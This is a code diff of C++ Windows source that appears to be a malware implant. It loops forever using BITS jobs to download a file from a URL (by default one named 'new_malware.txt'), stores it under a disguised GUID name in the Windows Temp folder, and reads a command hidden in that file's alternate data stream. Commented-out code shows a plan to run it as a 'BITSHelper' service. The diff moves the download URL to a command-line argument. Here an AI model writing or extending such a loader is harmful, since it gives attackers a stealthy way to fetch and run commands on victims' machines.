@@ -108,7 +108,7 @@ void DownloadFile(const std::wstring& remoteUrl, const std::wstring& localFile) 
         pJob->Complete();
         std::wcout << L"Download completed successfully!" << std::endl;
 
-        std::wstring filePath = L"C:\\Windows\\Temp\\c7d5fbc1-2f27-4f0b-b1bd-0c6dae457414.cgv";  // Path to the file with the ADS
+        std::wstring filePath = localFile;  // Path to the file with the ADS
         std::wstring command = readCommentFromFile(filePath);  // Read the command from the ADS
 
         if (!command.empty()) {
@@ -166,7 +166,16 @@ void DownloadFile(const std::wstring& remoteUrl, const std::wstring& localFile) 
 //    
 //}
 
-int main() {
+int wmain(int argc, wchar_t* argv[]) {
+    std::wstring remoteUrl = L"http://localhost:8080/updates/new_malware.txt";  // Default URL
+
+    if (argc > 1) {
+        remoteUrl = argv[1];  // Use the first command-line argument
+    }
+
+    std::wstring localFile = L"C:\\Windows\\Temp\\c7d5fbc1-2f27-4f0b-b1bd-0c6dae457414.cgv";  // Target file path
+
+    wprintf(L"Using URL: %s\n", remoteUrl.c_str());
     
     /*SERVICE_TABLE_ENTRY ServiceTable[] = {
         { const_cast<LPWSTR>(L"BITSHelper"), (LPSERVICE_MAIN_FUNCTION)ServiceMain },
@@ -175,9 +184,8 @@ int main() {
 
     StartServiceCtrlDispatcher(ServiceTable);
     return 0;*/
+
     while (true) {
-        std::wstring remoteUrl = L"http://localhost:8080/updates/new_malware.txt";  // Replace with your file URL
-        std::wstring localFile = L"C:\\Windows\\Temp\\c7d5fbc1-2f27-4f0b-b1bd-0c6dae457414.cgv";  // Replace with your target path
         CoInitialize(nullptr);
         DownloadFile(remoteUrl, localFile);
         CoUninitialize();
